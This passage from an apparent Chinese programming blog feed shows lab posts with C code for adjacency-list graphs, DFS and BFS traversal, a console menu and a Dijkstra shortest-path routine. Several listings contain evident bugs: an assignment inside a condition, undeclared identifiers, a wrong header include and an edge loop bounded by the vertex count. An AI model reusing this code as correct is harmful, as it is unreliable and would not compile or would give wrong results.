dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>数据结构第三次实验-图的深度广度遍历</title>
    <link href="https://xizhi-future.github.io/2021/11/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E5%9B%BE%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%B9%BF%E5%BA%A6%E9%81%8D%E5%8E%86/"/>
    <id>https://xizhi-future.github.io/2021/11/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C-%E5%9B%BE%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%B9%BF%E5%BA%A6%E9%81%8D%E5%8E%86/</id>
    <published>2021-11-29T23:55:23.000Z</published>
    <updated>2021-11-30T00:02:39.032Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/13/oEKADMSHmjBbnxc.png" alt="image-20211113152053894"></p><blockquote><p><strong>加项内容：</strong></p><ol><li><strong>最短路径</strong></li><li><strong>关键路径</strong></li><li><strong>拓扑排序</strong></li></ol></blockquote><p><strong>图邻接表定义头文件 （<code>深度优先遍历、广度优先遍历算法</code>）：<code>graph.h</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20<span class="comment">//预定义图的最大顶点数</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> visited[M];  <span class="comment">//作为访问的标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表创建 图结构定义 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;<span class="comment">//顶点信息数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span><span class="comment">//边表结点</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;<span class="comment">//邻接点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span><span class="comment">//指向下一个邻接点</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>&#123;</span><span class="comment">//头结点类型</span></span><br><span class="line">    DataType vertex;<span class="comment">//顶点信息</span></span><br><span class="line">    EdgeNode *FirstEdge;<span class="comment">//邻接链表头指针</span></span><br><span class="line">&#125;VertexNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span><span class="comment">//邻接表 类型</span></span><br><span class="line">    VertexNode adjlist[M];<span class="comment">//存放头结点的顺序表</span></span><br><span class="line">    <span class="keyword">int</span> n,e;  <span class="comment">//图的顶点数、边数</span></span><br><span class="line">&#125;LinkedGraph;</span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(LinkedGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    EdgeNode *s;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);<span class="comment">//读入顶点数与边数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g-&gt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;adjlist[i].vertex); <span class="comment">//读入顶点信息</span></span><br><span class="line">            g-&gt;adjlist[i].FirstEdge = <span class="literal">NULL</span>;    <span class="comment">//边表置为空表</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>; k &lt; g-&gt;n; k++)&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);<span class="comment">//输入无序对</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = j;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">g-&gt;adjlist[i].FirstEdge = s;       <span class="comment">//相当于 前插</span></span><br><span class="line"><span class="keyword">if</span>(c == <span class="number">0</span>)&#123;<span class="comment">//无向图</span></span><br><span class="line">s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">s-&gt;adjvex = i;</span><br><span class="line">s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//文件打开失败</span></span><br><span class="line">g-&gt;n = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">printf(&quot;%d,%d&quot;,g-&gt;n,g-&gt;e);</span></span><br><span class="line"><span class="comment">printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">for(i=0;i&lt;g-&gt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">printf(&quot;%c&quot;,g-&gt;adjlist[i].vertex);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问顶点：%c\n&quot;</span>,g.adjlist[i].vertex); <span class="comment">//访问顶点 i</span></span><br><span class="line">    visited[i] = <span class="number">1</span>;<span class="comment">//表示已经访问过</span></span><br><span class="line">    p = g.adjlist[i].FirstEdge;<span class="comment">//从 p 的邻接点开始进行 深度优先遍历</span></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[p-&gt;adjvex])</span><br><span class="line">            dfs(g,p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;g.n; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;   <span class="comment">//初始化都为 0 ，代表都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])<span class="comment">//如果 i 未被访问过</span></span><br><span class="line">            dfs(g,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">queue</span>[M],front,rear;  <span class="comment">//FIFO 队列</span></span><br><span class="line">    front = rear = <span class="number">0</span>; <span class="comment">//初始化空队列</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[i].vertex);</span><br><span class="line">    visited[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">queue</span>[rear++] = i;<span class="comment">//被访问结点进入队列</span></span><br><span class="line">    <span class="keyword">while</span>(rear &gt; front)&#123;</span><br><span class="line">        j = <span class="built_in">queue</span>[front++]; <span class="comment">// 出队</span></span><br><span class="line">        p = g.adjlist[j].FirstEdge;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[p-&gt;adjvex].vertex);</span><br><span class="line">                <span class="built_in">queue</span>[rear++] = p-&gt;adjvex;</span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回连通分量的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;  <span class="comment">//初始化标志数组，都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g.n ;i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;<span class="comment">//vi未被访问过</span></span><br><span class="line">            <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">            count++;<span class="comment">//计数器：连通分量 个数加1 </span></span><br><span class="line">            bfs(g,i);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>test.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------------菜单界面--------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; \t1.深度优先遍历          2.广度优先遍历       \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------0.退出----------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> select;</span><br><span class="line">    LinkedGraph g;</span><br><span class="line">    <span class="keyword">int</span> count,i;</span><br><span class="line">create(&amp;g,<span class="string">&quot;g7.txt&quot;</span>,<span class="number">0</span>);  <span class="comment">// 0 代表无向图</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">Menu();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入菜单选项：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line"><span class="keyword">switch</span>(select)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:  <span class="comment">//深度优先遍历</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;图的深度优先遍历序列为：\n&quot;</span>);</span><br><span class="line">DfsTraverse(g);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//广度优先遍历</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;图的广度优先遍历序列为：\n&quot;</span>);</span><br><span class="line">count = BfsTraverse(g);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;该图共有%d个连通分量\n&quot;</span>,count);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;您输入的选项有误，请重新输入：\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/13/Nq2oZ3BcWYHt1TV.png" alt="image-20211113155801024"></p><p><strong>测试：<code>test.cpp</code></strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;graph.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span>&#123;</span>FALSE,TRUE&#125; boolean;<span class="comment">//false 0   true 1</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> dist[M];<span class="comment">//距离向量类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> path[M];<span class="comment">//路径类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Dijkastra 算法求 单源最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkastra</span><span class="params">(Mgraph g,<span class="keyword">int</span> v0,path p,dist d)</span></span>&#123;</span><br><span class="line">    boolean <span class="keyword">final</span>[M]; <span class="comment">//标志 当前元素是否已经求出 最短路径</span></span><br><span class="line">    <span class="keyword">int</span> i,k,j,v,min,x;</span><br><span class="line">    <span class="comment">//初始化集合 S 与距离向量 d</span></span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>; v&lt;g.n; v++)&#123;</span><br><span class="line">        <span class="keyword">final</span>[v] = FALSE;</span><br><span class="line">        d[v] = g.edges[v0][v];</span><br><span class="line">        <span class="keyword">if</span>(d[v]&lt;FINITY &amp;&amp; d[v]=<span class="number">-1</span>)</span><br><span class="line">            p[v] = v0;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p[v] = <span class="number">-1</span>;  <span class="comment">//v 无前驱</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span>[v0] = TRUE;</span><br><span class="line">    d[v0] = <span class="number">0</span>;<span class="comment">//初始时 s 只有 v0 一个结点</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//依次找出 n-1 个结点加入 S 中</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;g.n; i++)&#123;</span><br><span class="line">        min = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;g.n; ++k)  <span class="comment">//找最小边入结点</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">final</span>[k] &amp;&amp; d[k] &lt; min)&#123;</span><br><span class="line">                v = k;</span><br><span class="line">                min = d[k];</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%c----%d\n&quot;</span>,g.vexs[v],min);</span><br><span class="line">        <span class="keyword">if</span>(min == FINITY)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">final</span>[v] = TRUE;  <span class="comment">//v 加入 S</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//修改 S 与 V-S 中各节点的距离</span></span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;g.n; ++k)</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">final</span>[k] &amp;&amp; (min+g.edges[v][k] &lt; d[k]) )&#123;</span><br><span class="line">                d[k] = min + edges[v][k];</span><br><span class="line">                p[k] = v;</span><br><span class="line">            &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出 有向图 最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pritn_gpd</span><span class="params">(Mgraph g,path p,dist d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> st[M],i,pre,top=<span class="number">-1</span>;<span class="comment">//定义栈 st 初始化空栈</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n距离：%7d,路径：&quot;</span>,d[i]);</span><br><span class="line">        st[++top] = i;</span><br><span class="line">        pre = p[i];</span><br><span class="line">        <span class="keyword">while</span>(pre != <span class="number">-1</span>)&#123;<span class="comment">//从第 i 个顶点开始向前搜索最短路径上的顶点</span></span><br><span class="line">            st[++top] = pre;</span><br><span class="line">            pre = p[pre];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(top &gt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%2d&quot;</span>,st[top--]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>数据结构第三次实验-2-图的深度广度遍历、拓扑排序、最短路径、关键路径</title>
    <link href="https://xizhi-future.github.io/2021/11/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C-2-%E5%9B%BE%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%B9%BF%E5%BA%A6%E9%81%8D%E5%8E%86%E3%80%81%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E3%80%81%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E3%80%81%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84/"/>
    <id>https://xizhi-future.github.io/2021/11/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%AE%9E%E9%AA%8C-2-%E5%9B%BE%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%B9%BF%E5%BA%A6%E9%81%8D%E5%8E%86%E3%80%81%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E3%80%81%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E3%80%81%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84/</id>
    <published>2021-11-29T23:51:03.000Z</published>
    <updated>2025-12-03T05:44:56.609Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="数据结构第三次实验-2-图的深度广度遍历、拓扑排序、最短路径、关键路径"><a href="#数据结构第三次实验-2-图的深度广度遍历、拓扑排序、最短路径、关键路径" class="headerlink" title="数据结构第三次实验_2-图的深度广度遍历、拓扑排序、最短路径、关键路径"></a>数据结构第三次实验_2-图的深度广度遍历、拓扑排序、最短路径、关键路径</h1><blockquote><p><strong>文件介绍：</strong></p><p><code>graph.h</code>        邻接表创建 图结构定义（实现 深度、广度优先遍历）</p><p><code>m_graph.h </code>    邻接矩阵创建 图结构定义 （为实现 求 最短路径做准备）</p><p><code>min.h</code>            Dijkastra 算法求 单源最短路径、输出 有向图 最短路径</p><p><code>r_graph.h</code>    带入度邻接表 存储结构 定义、AOV网络的创建（实现拓扑排序）</p><p><code>main.cpp</code>      主函数 （菜单、switch 结构选择菜单）</p></blockquote><h2 id="graph-h"><a href="#graph-h" class="headerlink" title="graph.h"></a>graph.h</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span 